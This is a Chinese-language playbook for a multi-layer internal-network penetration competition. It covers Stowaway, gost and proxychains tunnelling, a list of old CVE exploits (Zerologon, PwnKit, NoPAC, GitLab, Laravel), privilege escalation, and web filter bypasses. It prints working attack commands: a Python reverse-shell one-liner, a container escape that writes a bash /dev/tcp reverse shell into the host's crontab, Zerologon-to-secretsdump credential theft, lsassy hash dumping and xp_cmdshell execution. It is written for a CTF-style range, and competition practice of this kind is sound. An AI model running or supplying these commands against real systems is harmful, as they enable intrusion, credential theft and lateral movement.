# 渗透赛作战手册（三层内网靶场）

> 面向：多层内网渗透赛（三层嵌套：DMZ → 内网 → 核心内网）
> 依据：2023 某精英对抗赛 SU 战队完整复盘（三层网络、10 个靶标）
> 用法：**开局先看第 1 章搭代理**，再按第 2 章挑路线

---

## 0. 先记住三件事

1. **渗透赛没有附件** —— 全靠现场信息收集。**枚举速度与完整性 > 背 exp 数量。**
2. **网络是三层嵌套 + 单通道**：`DMZ → 内网 → 核心内网`。**内网不通本地 IP，只有 DMZ 通。**
3. **入口永远是弱口令或公开老 CVE**，不考 0day。**准备度就是分数。**

---

## 1. 隧道与代理（命门，5 分钟必须搭通）

### 1.0 先选工具 —— 这直接决定 proxychains 写几条

| | **gost / ssh 转发** | **Stowaway** |
|---|---|---|
| 代理监听在哪 | 每跳各自开 socks | **只在 admin 本地开一个 socks** |
| 出口在哪 | 就是那个跳板 | **`use` 选中哪个节点，出口就在哪个节点** |
| 级联谁来做 | **你在 proxychains 里手动串** | **Stowaway 内部已经做好** |
| proxychains 条数 | 多层 = **多条** | **一条** |
| 适合场景 | 跳板少、临时转发 | **多层级联（三层内网靶场）** |

> **一句话记牢：Stowaway 多层级联时 proxychains 只写一条，写多了反而错。**
> 写两条会让 proxychains 试图「先经第二条 socks、再经第一条」，第二次跃点是多余的，通常直接不通或绕远。

### 1.1 拓扑理解（三层嵌套 + 单通道）

```
你的机器
  │  （只有这一跳能通）
  ▼
DMZ 区  ──── 通本地 ✔
  │  （单通道）
  ▼
内网区  ──── 不通本地 ✗ 必须经 DMZ 转发
  │  （单通道）
  ▼
核心内网区 ── 不通本地 ✗ 必须逐层串起来
```

**结论：内网拿到的 shell 要反弹，只能弹到 DMZ 的 IP。**

### 1.2 Stowaway —— 多层级联首选

#### 1.2.1 搭链流程（对照 1.1 的三层网络）

```bash
# ① admin 在攻击机（admin 只允许挂 1 个直连 agent）
./stowaway_admin -l 10000 -s mysecret

# ② 第一跳：DMZ 机器（能通本地）主动回连
./stowaway_agent -c <attack_ip>:10000 -s mysecret

# ③ 让第一跳在 DMZ 上开监听，准备接第二跳
(admin) >> use 0
(node 0) >> listen           # 选 1 (Normal passive)，输入端口 10001

# ④ 第二跳：内网机器（不通本地）主动连第一跳
./stowaway_agent -c <DMZ_ip>:10001 -s mysecret

# ⑤ 第三跳：先让第二跳开监听
(node 0) >> back             # ★ 先退回主 panel
(admin) >> use 1
(node 1) >> listen           # 端口 10002
# 在核心内网机器上
./stowaway_agent -c <内网IP>:10002 -s mysecret

# ⑥ 开 socks —— 出口 = 你 use 的那个节点
(node 1) >> back             # ★ 切节点前都要先 back
(admin) >> topo              # 先确认父子关系对不对
(admin) >> use 0
(node 0) >> socks 7777       # admin:7777 → 出口 DMZ  → 打内网
(node 0) >> back             # ★
(admin) >> use 1
(node 1) >> socks 7778       # admin:7778 → 出口 内网 → 打核心内网
```

> **两个必须记住的点**
> 1. **`use` 只在主 panel 有**。你进了 `(node N) >>` 之后想切节点，**必须先 `back`**（node panel 的 21 条命令里没有 `use`）。`detail` / `topo` 同样只在主 panel。
> 2. `use <id>` 是命令，`(node 0) >>` 只是**提示符** —— 源码里没有 `node` 这个命令。

**先验证链路，再上 proxychains**（能省一半排查时间）：

```bash
curl -x socks5h://127.0.0.1:7778 http://192.168.30.13
# 通了 → 链路没问题，之后不通就是 proxychains 的锅
```

#### 1.2.2 命令表（源码核对，共 25 条）

**主 panel `(admin) >>`**

| 命令 | 作用 |
|---|---|
| `use <id>` | **选中节点，进入 node panel** |
| `detail` | 列出在线节点（IP / 主机名 / 用户 / memo） |
| `topo` | 显示节点父子拓扑 |
| `help` / `exit` | 帮助 / 退出 |

**node panel `(node 0) >>`**

| 命令 | 作用 |
|---|---|
| `status` | 看当前节点 socks / forward / backward 状态和活跃连接数 |
| `listen` | 当前节点开监听，等子节点连入（Normal / IPTables Reuse / SOReuse 三种模式） |
| `connect <ip:port>` | 当前节点**主动**连一个新节点 |
| `socks <lport> [user] [pass]` | 开 socks5（**监听在 admin 上，出口在当前节点**） |
| `stopsocks` | 关 socks |
| `forward <lport> <ip:port>` | 本地端口 → 远程（admin 本地监听） |
| `stopforward` | 关 forward |
| `backward <rport> <lport>` | 远程端口 → 本地（反向） |
| `stopbackward` | 关 backward |
| `ssh <ip:port>` | 经当前节点 SSH 到目标 |
| `sshtunnel <ip:sshport> <agent port>` | 用 SSH 隧道把节点接进拓扑 |
| `shell` | 当前节点的交互式 shell |
| `upload <local> <remote>` / `download <remote> <local>` | 上传 / 下载 |
| `addmemo <str>` / `delmemo` | 加 / 删节点备注 |
| `shutdown` | 结束当前节点 |
| `back` | 回主 panel |
| `help` / `exit` | 帮助 / 退出 |

> `listen` 与 `connect` 是一对：**`listen` = 被动等连入，`connect` = 主动连出去**。
> 搭链时上游用 `listen`，下游 agent 用 `-c` 连上来。

#### 1.2.3 proxychains 配置

**关键：端口 = 你想从哪一层出去**

| 你要打的目标 | admin 控制台 | proxychains 写 |
|---|---|---|
| DMZ 区 | `use <DMZ节点>` → `socks 7777` | `socks5 127.0.0.1 7777` |
| 内网区 | `use <内网节点>` → `socks 7778` | `socks5 127.0.0.1 7778` |
| 核心内网 | `use <核心节点>` → `socks 7779` | `socks5 127.0.0.1 7779` |

**单层用法（推荐，最简单）**

```ini
# /etc/proxychains4.conf
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 7777
```

**多层同时开、按网段切换** —— proxychains **不支持按目标网段分流**，所以用多配置文件 + 环境变量：

```bash
# /etc/proxychains_dmz.conf   → socks5 127.0.0.1 7777
# /etc/proxychains_inner.conf → socks5 127.0.0.1 7778
# /etc/proxychains_core.conf  → socks5 127.0.0.1 7779

PROXYCHAINS_CONF_FILE=/etc/proxychains_core.conf \
  proxychains4 nmap -sT -Pn -p 80,22,21 192.168.30.13
```

做成 alias 更省事：

```bash
alias pcdmz='PROXYCHAINS_CONF_FILE=/etc/proxychains_dmz.conf proxychains4'
alias pccore='PROXYCHAINS_CONF_FILE=/etc/proxychains_core.conf proxychains4'
```

**认证**：默认无认证，就写 `socks5 127.0.0.1 7777`，**别加用户名密码**。要认证则：
```bash
(node 0) >> socks 7777 myuser mypass
# 对应：socks5 127.0.0.1 7777 myuser mypass
```

#### 1.2.4 Stowaway 坑清单

| # | 坑 | 处理 |
|---|---|---|
| 1 | **`localnet` 让目标变直连**（最坑） | `proxychains4.conf` 里若有未注释的 `localnet 192.168.0.0/255.255.0.0`，打 `192.168.x.x` 会**绕过代理直连** → 表现「完全不通」。上去先注释掉 |
| 2 | **UDP / ICMP 基本不可用** | 官方只支持标准 **RFC1928 的 `UDP ASSOCIATE`**，丢包要自己处理；**ICMP 不支持** → `ping` 不通是正常的，用 `nc -vz` / `curl` 验 |
| 3 | 扫描器要用 TCP connect | `proxychains4 nmap -sT -Pn ...`（`-sT` 必须，SYN 扫描走不了 socks） |
| 4 | admin 只能有 1 个直连 agent | 多级必须从第一个 agent 往下挂 |
| 5 | admin 不在线，新节点不能加入 | 搭链期间 admin 保持运行 |
| 6 | `listen` 一次只接受一个子节点 | 同层挂多个节点就执行多次 `listen` |
| 7 | 关服务 / 看状态 | `stopsocks` 关代理，`status` 看状态与活跃连接 |
| 8 | Windows 的 admin 控制台乱码 | 装 [ansicon](https://github.com/adoxa/ansicon/releases)，`ansicon.exe -i` |

#### 1.2.5 proxychains 搞不定的，用 `forward` 兜底

有些工具不认 SOCKS（或需要 UDP），别硬套 proxychains：

```bash
(node 0) >> forward 13389 192.168.30.15:3389   # admin 本地 13389 → 远程 3389
# 然后直接：rdesktop 127.0.0.1:13389
```

反向用 `backward <rport> <lport>`；关闭 `stopforward` / `stopbackward`。

### 1.3 gost —— 逐跳转发（proxychains 多层串联）

**注意：这里是 gost 的模型，和 Stowaway 相反 —— 每跳各开 socks，proxychains 里按顺序串。**

#### 1.3.1 三种用法

**（a）`forward+ssh` —— 最常用，需要有 ssh 口令**

```bash
# 在 DMZ 机器上（作为代理服务端）
./gost -L forward+ssh://user:pass@:17979

# 在内网机器上（把内网网络顶到 DMZ）
./gost -L socks5://:7777
./gost -L rtcp://0.0.0.0:7979/localhost:7777 \
       -F forward+ssh://user:pass@<DMZ_IP>:17979?ping=30

# 验证：在 DMZ 上执行（能通就说明链路 OK）
curl -x socks5://localhost:17979 http://<内网目标>
```

**（b）`socks5` 直连** —— 目标能直连时最省事
```bash
./gost -L socks5://:7777
```

**（c）`rtcp` 端口转发** —— 只转单个端口
```bash
./gost -L rtcp://0.0.0.0:3389/<目标>:3389 -F socks5://...
```

#### 1.3.2 proxychains 串联多层

`/etc/proxychains4.conf`（**按顺序，先最外层**）：

```ini
strict_chain
proxy_dns

[ProxyList]
socks5 127.0.0.1 8888     # 第一层 DMZ
socks5 127.0.0.1 7979     # 第二层 内网
```

用法：`proxychains4 python3 exp.py`、`proxychains4 nmap -sT -Pn ...`

> ⚠️ 同样要检查 `localnet 192.168.0.0/255.255.0.0` 是否被注释掉（见 1.2.4 第 1 条）。

### 1.4 两种方式混用时的 proxychains

**不要塞进同一个 `[ProxyList]`** —— 那是串联语义，会双重代理。

混用场景（例如：Stowaway 走多级，但 DMZ 上另开了个 gost socks5 给某个特殊工具）本质是**互补关系**，靠**多配置文件按目标分开**：

```bash
PROXYCHAINS_CONF_FILE=/etc/proxychains_stowaway.conf proxychains4 <工具 A>
PROXYCHAINS_CONF_FILE=/etc/proxychains_gost.conf     proxychains4 <工具 B>
```

### 1.5 反弹 shell（内网不通本地时的标准做法）

```bash
# 第一步：先把 DMZ 的 shell 反弹到本地（拿到交互式 DMZ shell）
#   注意：有的环境标准 bash 反弹会失败，用 python3 更稳
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.10",9090));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

# 第二步：在 DMZ shell 上监听
nc -lnvp 9090

# 第三步：用内网漏洞的 exp，反弹到 DMZ 的 IP（不是本地！）
```

### 1.6 通用坑（fscan 等）

| 坑 | 处理 |
|---|---|
| fscan 线程开太大，扫不到资产 | **降线程 + 加 `-np` 关 ping**，重扫 |
| 扫完机器变慢 / 漏资产 | 把 fscan 进程一个个杀掉再重跑 |
| 内网 exp 无回显 | 反弹 shell 到 DMZ，别指望回显 |
| 标准 bash 反弹失败 | 换 python3 反弹 |

```bash
# fscan 标准起手
./fscan -h 192.168.20.0/24 -np
```

## 2. 老 CVE 离线武器库（出题口味：2020–2021）

**每一个赛前都要在本机离线跑通一遍，包括前置条件验证。**

| CVE | 目标 | 打法要点 |
|---|---|---|
| **CVE-2021-22205** | GitLab | 未授权 RCE，**无回显** → 必须反弹 shell；注意 GitLab 不好做权限维持 |
| **CVE-2021-3129** | Laravel + Ignition | `/api/file` 任意文件读 → 读 `config/logging.php` 定位日志路径 → `execute-solution` + `php://filter` 链写日志 getshell。**复用的是网鼎杯决赛原题** |
| **CVE-2020-1472** | Zerologon（域控） | 打空域控机器账户密码 → `secretsdump` 拿 Administrator NTLM + krbtgt → `wmiexec` |
| **CVE-2021-4034** | PwnKit（Linux 提权） | 用户目录常见 `poc.c`，`gcc poc.c -o poc && ./poc` |
| **CVE-2021-42278/42287** | NoPAC（AD 提权） | 普通域账户冒充 Domain Admin |
| 其他待补 | Log4j2 / Shiro / Fastjson / ThinkPHP | 按你手上环境补齐 |

**常用组合命令**

```bash
# Zerologon 后拿凭据
proxychains4 python3 cve-2020-1472-exploit.py DC 192.168.20.15 1
proxychains4 python3 secretsdump.py -hashes :<NTLM> "company.local/Administrator@<DC_IP>"

# 横向执行
proxychains4 python3 wmiexec.py -hashes :<NTLM> company.local/Administrator@<TARGET>

# 取 hash（NoPAC 之后）
cme smb <TARGET> -u "user" -p 'LAB2022\!@#_summer' -M lsassy
```

## 3. 提权 / 逃逸

| 场景 | 手法 |
|---|---|
| **MySQL**（phpstudy 环境） | **UDF 提权**：`select @@plugin_dir` → `SELECT 0x<dll> INTO DUMPFILE '<plugin_dir>\udf.dll'` → `create function sys_eval returns string soname 'udf.dll'` → `select sys_eval("whoami")` |
| **Linux 本地** | `find / -perm -u=s -type f 2>/dev/null` 找 SUID（真题里 `cp` 带 s 位，直接 `cp flag` 读）；内核 CVE；sudo 配置 |
| **PwnKit** | 见上表 |
| **特权 Docker 容器逃逸** | `fdisk -l` 看磁盘 → `mkdir /tmp/data` → `mount /dev/vda1 /tmp/data` → 写宿主机 `/tmp/data/var/spool/cron/crontabs/root` 反弹 shell |
| **SQLServer** | `impacket-mssqlclient` 连上后 → `enable_xp_cmdshell` → `xp_cmdshell whoami` |

**容器逃逸原文手法**
```bash
fdisk -l
mkdir /tmp/data
mount /dev/vda1 /tmp/data
echo '* * * * * bash -i >& /dev/tcp/<DMZ_IP>/8888 0>&1' \
     >> /tmp/data/var/spool/cron/crontabs/root
```

## 5. 现场动作顺序（照做）

```
1. 拿到入口 → 指纹识别（先别急着打）
2. 弱口令/已知 CVE 试探
3. 拿 shell → 立刻 ls -la、翻 /home、翻配置（找凭据 + hint 文件）
4. 找提权（UDF / SUID / PwnKit / 容器逃逸）
5. 凭据复用 → 横向到下一台（同一密码试所有服务）
6. 搭代理 → 进下一层（内网 → 核心内网）
7. 终点打域（Zerologon / NoPAC / lsassy）
```

**关键习惯**
- **拿到 shell 第一件事 `ls -la` + 翻 `/home`** —— 真题里 flag 旁边就放着 `.hint.txt`（给的是密码**模式**，要自己爆破，比如 `SecretData_xxxx!@#` 四位数）
- **凭据要复用**：`config.php` 里的 DB 密码 → 直接去连另一台的 3306；Tomcat 里翻到的 SSH 口令 → 去连 10022
- **翻容器**：宿主机上另一个容器里常有数据库密码
- **FTP 拉不动就换被动模式**：`quote PASV`（`500 Illegal PORT command` 就是这个坑）

## 6. Web 基本盘（GXYCTF 系，出题方自家招牌）

| 题型 | 关键点 |
|---|---|
| **无参数 RCE** | `localeconv()` 取 `.` → `scandir()` → `array_reverse()`+`next()` 读文件；`get_defined_vars()` / `getallheaders()` / `session_id()` 三种取参姿势 |
| **命令执行过滤绕过** | 空格：`$IFS$9`、`${IFS}`、`%09`；关键字：变量拼接 `a=ag;b=fl;cat$IFS$9$b$a.php`、base64、`` `ls` `` 内联 |
| **写文件受限** | 不能用 `>` 时用 `tee`：`nl /flag | tee 0.txt` |
| **PHP 反序列化** | 脚本抛错会中断 `__destruct` → **数组下标覆盖提前触发**（把 `i:1;N;` 改成 `i:0;N;`） |
| **文件上传** | 传 `.htaccess` 让指定后缀被当 PHP 解析；改后台模板名（`.htm` → `.php`） |
| **JWT + SSTI** | 密钥爆破（真题是 `tomcat`）、`""["\x5F\x5Fclass\x5F\x5F"]` 十六进制转义绕 `__`/`.` 过滤 |
| **信息泄露** | `.git` 泄露用 GitHack 拖源码 |
